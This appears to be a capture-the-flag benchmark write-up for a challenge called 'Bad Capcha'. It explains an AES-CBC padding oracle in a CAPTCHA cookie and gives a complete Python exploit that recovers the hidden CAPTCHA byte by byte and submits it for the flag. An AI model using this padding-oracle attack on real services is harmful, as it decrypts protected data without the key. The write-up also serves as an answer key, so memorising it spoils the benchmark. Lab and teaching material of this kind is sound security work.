# XBEN-101-24 — Bad Capcha

> **Live PoC:** Start the benchmark with `make run`, then run `make poc` from its benchmark directory. The runner discovers the current published port and prints only the flag recovered from the running service.

**Vulnerability:** AES-CBC padding oracle. The server encrypts the full (unredacted) 14-character
CAPTCHA text with AES-256-CBC and stores it in a `captcha` cookie; the CAPTCHA *image* only shows
the first 8 characters (last 6 are `......`). On submission, `decrypt_captcha()` removes PKCS7
padding and raises `ValueError("Invalid padding bytes.")` on bad padding, which the route handler
catches and returns as the distinguishable response `"Invalid padding"` (HTTP 200) — versus
`"Invalid CAPTCHA!"` (HTTP 403) when padding is valid but the value is wrong, versus the flag when
both are correct. This three-way oracle (bad padding / valid padding+wrong value / valid
padding+right value) is a textbook CBC padding oracle: an attacker can manipulate the ciphertext's
preceding block (here, the IV, since the plaintext is exactly one 16-byte block: 14 chars + `\x02\x02`
padding) byte-by-byte to recover the full plaintext CAPTCHA without ever knowing the AES key, then
submit it back to get the flag.

## Exploit

```python
import requests, base64

BASE = "http://localhost:65213/"
s = requests.Session()

def get_cookie():
    r = s.get(BASE)
    return base64.b64decode(r.cookies.get('captcha'))

def oracle(iv_block, cipher_block):
    cookie_b64 = base64.b64encode(iv_block + cipher_block).decode()
    r = requests.post(BASE, cookies={'captcha': cookie_b64},
                       data={'username': 'test', 'captcha': 'wrongvalue-xyz'})
    return 'Invalid padding' not in r.text   # True = valid PKCS7 padding

raw = get_cookie()
iv, ct = raw[:16], raw[16:32]
block_size = 16
intermediate = bytearray(block_size)
plaintext = bytearray(block_size)

for pad_val in range(1, block_size + 1):
    pos = block_size - pad_val
    fake_iv = bytearray(block_size)
    for k in range(pos + 1, block_size):
        fake_iv[k] = intermediate[k] ^ pad_val
    for guess in range(256):
        fake_iv[pos] = guess
        if oracle(bytes(fake_iv), ct):
            if pad_val == 1:  # avoid a false-positive on 0x01 padding
                fake_iv2 = bytearray(fake_iv); fake_iv2[pos - 1] ^= 0xFF
                if not oracle(bytes(fake_iv2), ct):
                    continue
            intermediate[pos] = guess ^ pad_val
            plaintext[pos] = intermediate[pos] ^ iv[pos]
            break

captcha = bytes(plaintext[:14]).decode()

# Submit the recovered captcha back on the SAME cookie to retrieve the flag
cookie_b64 = base64.b64encode(raw).decode()
r = requests.post(BASE, cookies={'captcha': cookie_b64},
                   data={'username': 'attacker', 'captcha': captcha})
print(r.text)
```
